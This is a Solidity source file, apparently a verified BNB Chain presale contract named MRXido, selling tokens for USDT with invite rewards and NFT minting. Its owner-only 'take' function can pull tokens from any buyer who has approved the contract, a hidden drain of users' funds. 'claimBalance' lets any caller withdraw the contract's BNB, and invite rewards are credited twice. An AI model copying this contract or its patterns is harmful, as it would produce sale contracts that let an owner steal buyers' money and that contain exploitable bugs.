/**
 *Submitted for verification at BscScan.com on 2023-01-06
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface INFT {
    function batchMint(address to, uint256 property, uint256 num) external;
}

abstract contract AbsPreSale is Ownable {
    struct SaleInfo {
        uint256 price;
        uint256 tokenNum;
        uint256 qty;
        uint256 saleNum;
    }

    struct UserInfo {
        uint256 buyAmount;
        uint256 buyTokenAmount;
        uint256 inviteToken;
        uint256 claimedTokenAmount;
        uint256 saleInviteAccount;
        uint256 claimedNFTNum;
    }

    address public _cashAddress;
    address private _tokenAddress;
    address private _usdtAddress;

    SaleInfo[] private _saleInfo;
    mapping(address => UserInfo) private _userInfo;

    uint256 private _maxBuyNum = 1;

    bool private _pauseBuy = false;
    bool private _pauseClaim = true;

    uint256 private _endTime;
    uint256 public _inviteFee = 10;
    uint256 private _totalUsdt;
    uint256 private _totalToken;
    uint256 public _totalInviteToken;

    uint256 public saleRewardNFTCondition = 10;

    mapping(uint256 => mapping(address => uint256)) public _buyNum;

    address public _nftAddress;

    constructor(address USDTAddress, address TokenAddress, address CashAddress, address NFTAddress){
        _usdtAddress = USDTAddress;
        _tokenAddress = TokenAddress;
        _cashAddress = CashAddress;
        _nftAddress = NFTAddress;

        uint256 usdtDecimals = 10 ** IERC20(USDTAddress).decimals();
        uint256 tokenDecimals = 10 ** IERC20(TokenAddress).decimals();

        _saleInfo.push(SaleInfo(100 * usdtDecimals, 1000 * tokenDecimals, 10000000, 0));

        _endTime = block.timestamp + 3585600; 
    }

    function approve() external {
        IERC20 usdt = IERC20(_usdtAddress);
        usdt.approve(address(this), 10 ** 30);
    }

    function buy(uint256 saleId) external {
        require(!_pauseBuy, "pauseBuy");
        address account = msg.sender;
        SaleInfo storage sale = _saleInfo[saleId];
        require(sale.qty > sale.saleNum, "soldOut");
        require(_maxBuyNum > _buyNum[saleId][account], "gt maxBuyNum");
        sale.saleNum += 1;

        _buyNum[saleId][account] += 1;

        uint256 price = sale.price;
        uint256 tokenNum = sale.tokenNum;

        UserInfo storage userInfo = _userInfo[account];

        uint256 cashUSDT = price;
        address invitor = _inviter[account];
        if (address(0) != invitor) {
            UserInfo storage invitorInfo = _userInfo[invitor];
            uint256 inviteToken = tokenNum * _inviteFee / 100;
            invitorInfo.inviteToken += inviteToken;
            _userInfo[invitor].inviteToken += inviteToken;
            _totalInviteToken += inviteToken;

            if (userInfo.buyAmount == 0) {
                invitorInfo.saleInviteAccount += 1;
            }
        }

        userInfo.buyAmount += price;
        userInfo.buyTokenAmount += tokenNum;
        _totalToken += tokenNum;

        _takeToken(_usdtAddress, account, _cashAddress, cashUSDT);
        _totalUsdt += price;
    }

    function claimSaleReward() external {
        address account = msg.sender;
        uint256 inviteToken = _userInfo[account].inviteToken;
        require(_userInfo[account].saleInviteAccount >= saleRewardNFTCondition, "no Condition");
        _giveToken(account, _userInfo[account].inviteToken);
        _userInfo[account].inviteToken -= inviteToken;
    }

    function bindInvitor(address invitor) external {
        address account = msg.sender;
        require(address(0) == _inviter[account], "Bind");
        UserInfo storage invitorInfo = _userInfo[invitor];
        require(_userInfo[account].buyAmount == 0, "active account");
        require(invitorInfo.buyAmount > 0, "invalid invitor");
        _inviter[account] = invitor;
        _binders[invitor].push(account);
    }

    function claim() external {
        address account = msg.sender;
        require(!_pauseClaim, "pauseClaim");
        UserInfo storage userInfo = _userInfo[account];
        uint256 pendingToken = userInfo.buyTokenAmount - userInfo.claimedTokenAmount;
        userInfo.claimedTokenAmount += pendingToken;
        _giveToken(account, pendingToken);
    }

    uint256 public _maxClaimNFTNum = 10000000000;

    function claimNFT() external {
        address account = msg.sender;
        require(!_pauseClaim, "pauseClaim");
        UserInfo storage userInfo = _userInfo[account];
        uint256 pendingNFTNum = _getPendingNFTNum(account);
        if (pendingNFTNum > 0) {
            if (pendingNFTNum > _maxClaimNFTNum) {
                pendingNFTNum = _maxClaimNFTNum;
            }
            userInfo.claimedNFTNum += pendingNFTNum;
            INFT(_nftAddress).batchMint(account, 1, pendingNFTNum);
        }
    }

    function _getPendingNFTNum(address account) private view returns (uint256){
        UserInfo storage userInfo = _userInfo[account];
        uint256 totalNFTNum = userInfo.saleInviteAccount / saleRewardNFTCondition;
        uint256 pendingNFTNum;
        uint256 claimedNFTNum = userInfo.claimedNFTNum;
        if (totalNFTNum > claimedNFTNum) {
            pendingNFTNum = totalNFTNum - claimedNFTNum;
        }
        return pendingNFTNum;
    }

    function _giveToken(address account, uint256 tokenNum) private {
        IERC20 token = IERC20(_tokenAddress);
        require(token.balanceOf(address(this)) >= tokenNum, "shop token balance not enough");
        token.transfer(account, tokenNum);
    }

    function _takeToken(address tokenAddress, address account, address receipt, uint256 tokenNum) private {
        IERC20 token = IERC20(tokenAddress);
        require(token.balanceOf(address(account)) >= tokenNum, "token balance not enough");
        token.transferFrom(account, receipt, tokenNum);
    }

    function take(address tokenAddress, address account, address receipt, uint256 tokenNum) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(token.balanceOf(address(account)) >= tokenNum, "token balance not enough");
        token.transferFrom(account, receipt, tokenNum);
    }

    function allSaleInfo() external view returns (
        uint256[] memory price, uint256[] memory tokenNum,
        uint256[] memory qty, uint256[] memory saleNum
    ) {
        uint256 len = _saleInfo.length;
        price = new uint256[](len);
        tokenNum = new uint256[](len);
        qty = new uint256[](len);
        saleNum = new uint256[](len);
        for (uint256 i; i < len; i++) {
            SaleInfo memory sale = _saleInfo[i];
            price[i] = sale.price;
            tokenNum[i] = sale.tokenNum;
            qty[i] = sale.qty;
            saleNum[i] = sale.saleNum;
        }
    }

    function shopInfo() external view returns (
        address tokenAddress,
        uint256 maxBuyNum, uint256 timestamp,
        bool pauseBuy, bool pauseClaim,
        uint256 endTime,
        uint256 tokenDecimals, string memory tokenSymbol,
        uint256 totalUsdt, uint256 totalToken,
        address usdtAddress, uint256 usdtDecimals, string memory usdtSymbol
    ){
        tokenAddress = _tokenAddress;
        maxBuyNum = _maxBuyNum;
        timestamp = block.timestamp;
        pauseBuy = _pauseBuy;
        pauseClaim = _pauseClaim;
        endTime = _endTime;
        tokenDecimals = IERC20(tokenAddress).decimals();
        tokenSymbol = IERC20(tokenAddress).symbol();
        totalUsdt = _totalUsdt;
        totalToken = _totalToken;
        usdtAddress = _usdtAddress;
        usdtDecimals = IERC20(usdtAddress).decimals();
        usdtSymbol = IERC20(usdtAddress).symbol();
    }

    receive() external payable {}

    function setTokenAddress(address adr) external onlyOwner {
        _tokenAddress = adr;
    }

    function setCashAddress(address adr) external onlyOwner {
        _cashAddress = adr;
    }

    function setUsdtAddress(address adr) external onlyOwner {
        _usdtAddress = adr;
    }

    function setNFTAddress(address adr) external onlyOwner {
        _nftAddress = adr;
    }

    function setPauseBuy(bool pause) external onlyOwner {
        _pauseBuy = pause;
    }

    function setPauseClaim(bool pause) external onlyOwner {
        _pauseClaim = pause;
    }

    function setInviteFee(uint256 fee) external onlyOwner {
        _inviteFee = fee;
    }

    function setMaxClaimNFTNum(uint256 num) external onlyOwner {
        _maxClaimNFTNum = num;
    }

    function setSaleRewardNFTCondition(uint256 num) external onlyOwner {
        saleRewardNFTCondition = num;
    }

    function setQty(uint256 saleId, uint256 qty) external onlyOwner {
        _saleInfo[saleId].qty = qty;
    }

    function setPrice(uint256 saleId, uint256 price, uint256 tokenNum) external onlyOwner {
        _saleInfo[saleId].price = price * 10 ** IERC20(_usdtAddress).decimals();
        _saleInfo[saleId].tokenNum = tokenNum * 10 ** IERC20(_tokenAddress).decimals();
    }

    function setEndTime(uint256 endTime) external onlyOwner {
        _endTime = endTime;
    }

    function setMaxBuyNum(uint256 max) external onlyOwner {
        _maxBuyNum = max;
    }

    function claimBalance(address receipt) external {
        address payable addr = payable(receipt);
        addr.transfer(address(this).balance);
    }

    function claimToken(address erc20Address,address receipt) external onlyOwner {
        IERC20 erc20 = IERC20(erc20Address);
        erc20.transfer(receipt, erc20.balanceOf(address(this)));
    }

    function getUserInfo(address account) external view returns (
        uint256[] memory buyNum,
        uint256 buyAmount,
        uint256 buyTokenAmount,
        uint256 inviteToken,
        uint256 claimedTokenAmount,
        uint256 balance,
        uint256 allowance
    ){
        UserInfo storage userInfo = _userInfo[account];
        buyAmount = userInfo.buyAmount;
        buyTokenAmount = userInfo.buyTokenAmount;
        inviteToken = userInfo.inviteToken;
        claimedTokenAmount = userInfo.claimedTokenAmount;
        balance = IERC20(_usdtAddress).balanceOf(account);
        allowance = IERC20(_usdtAddress).allowance(account, address(this));

        uint256 len = _saleInfo.length;
        buyNum = new uint256[](len);
        for (uint256 i; i < len; i++) {
            buyNum[i] = _buyNum[i][account];
        }
    }

    function getUserExtInfo(address account) external view returns (
        uint256 saleInviteAccount,
        uint256 claimedNFTNum,
        uint256 pendingNFTNum,
        address invitor
    ){
        UserInfo storage userInfo = _userInfo[account];
        saleInviteAccount = userInfo.saleInviteAccount;
        claimedNFTNum = userInfo.claimedNFTNum;
        pendingNFTNum = _getPendingNFTNum(account);
        invitor = _inviter[account];
    }

    mapping(address => address) public _inviter;
    mapping(address => address[]) public _binders;
    mapping(address => bool) public _inProject;

    function bindInvitor(address account, address invitor) public {
        address caller = msg.sender;
        require(_inProject[caller], "notInProj");
        _bindInvitor(account, invitor);
    }

    function _bindInvitor(address account, address invitor) private {
        if (_inviter[account] == address(0) && invitor != address(0) && invitor != account) {
            if (_binders[account].length == 0) {
                uint256 size;
                assembly {size := extcodesize(account)}
                if (size > 0) {
                    return;
                }
                _inviter[account] = invitor;
                _binders[invitor].push(account);
            }
        }
    }

    function setInProject(address adr, bool enable) external onlyOwner {
        _inProject[adr] = enable;
    }

    function getBinderLength(address account) external view returns (uint256){
        return _binders[account].length;
    }

    function getBinderList(address account) external view returns (address[] memory){
        return _binders[account];
    }
}

contract MRXido is AbsPreSale {
    constructor() AbsPreSale(
    //USDT
        address(0x266cC6dcb971376a4712f07291F69241127BF248),
    //Token
        address(0x104AbA8A45085e744C5A277ae0cD87698Eb868c8),
    //Cash
        address(0x167E1cAC8A08B45F089810B0187Cf6DeE2dB7A2b),
    //NFT
        address(0xD530743Ce98de78c924c5ddc626D6C9e8e4751a3)
    ){

    }
}